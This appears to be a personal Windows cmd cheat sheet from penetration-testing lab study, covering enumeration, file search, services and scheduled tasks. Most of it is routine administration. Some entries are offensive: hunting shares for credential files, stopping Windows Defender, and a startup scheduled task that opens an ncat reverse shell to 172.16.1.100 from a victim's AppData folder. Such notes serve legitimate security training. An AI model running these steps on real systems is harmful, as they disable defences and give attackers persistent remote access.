---
edit: Need to update and edit
---

# Windows cmd commands

## File commands CMD

```cmd
# Show history selection
F7

# like less can be piped
more 

# Find not case sensitive
find /i

# List hidden
dir /A:H
tree /F

# Copy
robocopy /E /MIR /A-:SH
xcopy /E

# files/folder creation
fsutil file createNew
```

## Enumeration

```cmd
# System Information
whoami
whoami /priv
whoami /groups
systemifo
hostname
ver

ipconfig /all
arp /a - arp cache

net localgroup - show local groups
net share
net view - list servers connected
```

## Finding files

[findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) - cheatsheet

```cmd
# Locate files
where /R
where /R C:\Users\student\ *.csv

find "password" "C:\Users\student\not-passwords.txt" 

# General find files
dir n:\*cred* /s /b
n:\Contracts\private\credentials.txt

# Grep like
findstr /s /i cred n:\*.*
n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!

# find compare
fc passwords.txt modded.txt /N
comp .\file-1.md .\file-2.md
```

## Env Variable

```cmd
echo %WINDIR%
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
echo %SECRET%

# Admin
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
# user
HKEY_CURRENT_USER\Environment
```

## Services handling

```cmd
# Query
sc query type= service
sc query windefend
sc stop windefend

tasklist /svc
net start
wmic service list brief

# Disable
sc config bits start= disabled
```

## Scheduled tasks

#### Query Syntax

```cmd
# View running
SCHTASKS /Query /V /FO list

# Create reverse shell
/create : to tell it what we are doing
/sc : we must set a schedule
/tn : we must set the name
/tr : we must give it an action to take

schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

# Modify
/tn 	Designates the task to change
/tr 	Modifies the program or action that the task runs.
/ENABLE 	Change the state of the task to Enabled.
/DISABLE 	Change the state of the task to Disabled.

schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

# query the made task
schtasks /query /tn "My Secret Task" /V /fo list 

# Delete
schtasks /delete  /tn "My Secret Task"
```



